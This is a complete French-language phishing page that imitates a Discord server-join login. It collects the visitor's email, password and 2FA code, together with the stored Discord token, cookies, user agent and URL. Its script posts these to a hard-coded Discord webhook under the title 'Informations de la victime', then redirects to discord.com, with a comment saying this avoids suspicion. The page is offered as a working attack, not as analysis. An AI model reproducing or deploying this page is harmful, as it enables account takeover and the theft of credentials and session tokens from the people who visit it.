<!DOCTYPE html>
<html>
<head>
    <title>Discord - Rejoignez votre serveur</title>
    <style>
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #36393f;
            color: #dcddde;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #2f3136;
            border-radius: 8px;
            padding: 30px;
            width: 400px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 100px;
        }
        h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #fff;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #b9bbbe;
        }
        input {
            width: 100%;
            padding: 10px;
            background-color: #202225;
            border: 1px solid #202225;
            border-radius: 3px;
            color: #dcddde;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #7289da;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #7289da;
            border: none;
            border-radius: 3px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        button:hover {
            background-color: #5a6ebf;
        }
        .error {
            color: #f04747;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="100" height="100" viewBox="0 0 100 100">
                <path fill="#7289DA" d="M82.4,19.1c-7.5-3.4-15.5-5.9-23.9-7.3c-1.5,2.6-3.2,5.9-3.7,8.7c-8.8-1.3-17.5-1.3-26.1,0c-0.5-2.8-2.3-6.1-3.7-8.7c-8.4,1.4-16.4,3.9-23.9,7.3C-4.2,43.6-0.8,67.3,8.5,90.9c7.9-5.8,14.8-12.3,20.6-19.5c-2.8-1-5.6-2.2-8.2-3.6c0.7-0.5,1.4-1,2-1.5c16,7.4,33.3,7.4,49.1,0c0.6,0.5,1.3,1,2,1.5c-2.6,1.4-5.3,2.6-8.2,3.6c5.8,7.2,12.7,13.7,20.6,19.5C92.7,67.3,96.2,43.6,82.4,19.1z M34.5,73.2c-4.8,0-8.8-4.4-8.8-9.8c0-5.4,3.9-9.8,8.8-9.8c4.9,0,8.8,4.4,8.8,9.8C43.3,68.8,39.4,73.2,34.5,73.2z M65.5,73.2c-4.8,0-8.8-4.4-8.8-9.8c0-5.4,3.9-9.8,8.8-9.8c4.9,0,8.8,4.4,8.8,9.8C74.3,68.8,70.4,73.2,65.5,73.2z"/>
            </svg>
        </div>
        <h2>Rejoignez votre serveur Discord</h2>
        <div id="loginForm">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" placeholder="votre@email.com">
                <div id="emailError" class="error">Email invalide</div>
            </div>
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" placeholder="••••••••">
                <div id="passwordError" class="error">Mot de passe incorrect</div>
            </div>
            <button id="loginBtn">Se connecter</button>
        </div>
        <div id="twoFactor" style="display: none;">
            <div class="form-group">
                <label for="code">Code d'authentification</label>
                <input type="text" id="code" placeholder="XXXXXX">
                <div id="codeError" class="error">Code invalide</div>
            </div>
            <button id="verifyBtn">Vérifier</button>
        </div>
    </div>

    <script>
        document.getElementById('loginBtn').addEventListener('click', function() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                document.getElementById('emailError').style.display = 'block';
                return;
            }
            
            // Simuler une vérification
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('twoFactor').style.display = 'block';
        });
        
        document.getElementById('verifyBtn').addEventListener('click', function() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const code = document.getElementById('code').value;
            
            // Récupérer les données Discord
            const discordToken = localStorage.getItem('token') || '';
            const cookies = document.cookie;
            const userAgent = navigator.userAgent;
            const url = window.location.href;
            
            // Envoyer les données
            fetch('https://discord.com/api/webhooks/1387685182403772487/r_8GXyo8rkepMEQ2m2d27BfugmckemXTB8vx-NgQWCGUi-ME6H1eh-CHzLbO6A6nd0HL', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "Nouvelles informations Discord collectées",
                    embeds: [{
                        title: "Informations de la victime",
                        description: `Email: ${email}\nMot de passe: ${password}\nCode 2FA: ${code}\nToken Discord: ${discordToken}\nCookies: ${cookies}\nUser-Agent: ${userAgent}\nURL: ${url}`,
                        color: 16711680
                    }]
                })
            }).catch(() => {});
            
            // Rediriger vers Discord pour éviter les soupçons
            window.location.href = 'https://discord.com';
        });
    </script>
</body>
</html>
